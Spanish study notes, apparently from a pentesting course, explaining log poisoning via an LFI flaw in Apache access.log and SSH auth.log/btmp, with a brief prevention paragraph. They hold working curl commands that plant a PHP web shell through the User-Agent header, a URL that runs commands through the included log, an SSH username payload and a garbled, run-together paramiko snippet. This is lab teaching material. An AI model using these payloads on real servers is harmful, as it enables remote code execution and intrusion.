- Tags: #recursos #lfi
El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr una **ejecución remota de comandos** en el servidor.

Como ejemplos para esta clase, trataremos de envenenar los recursos ‘**auth.log**‘ de **SSH** y ‘**access.log**‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘**auth.log**‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘**access.log**‘ de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘access.log’ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘**auth.log**‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘**btmp**‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.

Notas :
Es importante destacar que por defecto los archivos de logs solo son accedidos por root pero si por error tenemos un mala configuración pues podemos envenenarlos y poder llegar a ejecutar código

```bash
#Estariamos insertando en el fichero access.log Probando y pudieramos hacer lo mismo con codigo php

curl -s -X GET "http://localhost:8081" -H "User-Agent: Probando "

curl -s -X GET "http://localhost:8081" -H "User-Agent: <?php system('whoami');?> "

#Se pueden saber las funciones disponibles con phpinfo pero no es recomendable pues podemos corromper el log y perder una potencial via de acceso 
curl -s -X GET "http://localhost:8081" -H "User-Agent: <?php phpinfo();?>"

#Podemos insertar comando para que me permita controlar el comando a ejecutar desde el navegador. Especial cuidado en este pues si no escapaoms el caracter $ nos da problemas

curl -s -X GET "http://localhost:8081" -H "User-Agent: <?php system(\$_GET['cmd']);?>"

#Desde la url accedemos a este de la siguiente manera
http://localhost:8081/page.php?file=/var/log/apache2/access.log&cmd=cat%20/etc/hosts

```

Podemos hacer lo mismo con ssh , cabe destacar que para este lo normal es encontrar un archivo auth.lo en el directorio /var/log/auth.log pero en la actualidad han habido cambio y normalment es el archivo btmp en el directorio /var/log

Cuando intentamos conectar por ssh siempre registra un log en estos archivos antes mencionados.
![](../../../attachments/Pasted%20image%2020260121085530.png)

![](../../../attachments/Pasted%20image%2020260121085744.png)

Como podemos proceder, pues insertando nuestro código en el lugar del usuario , para poder ejecutar este tipo de ataques debemos poder leer estos archivos desde la web
```bash
#Destacar que para las versiones modernas de ssh no funciona de esta manera ya que controlan muy bien la entrada de caracteres asi que nos lanza esto 
ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2
remote username contains invalid characters
```

Una alternativa es utilizar python para poder inyectar el código al log
```python
#!/usr/bin/python3
import paramiko ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect('172.17.0.2', username='', password='cualquiercosa')

#Teniendo acceso al log desde la url  veriamos en nuestro caso dimos permiso de lectura en el equipo a el fichero btmp
http://localhost:8081/page.php?file=/var/log/btmp&cmd=ls -l
```

![](../../../attachments/Pasted%20image%2020260121092613.png)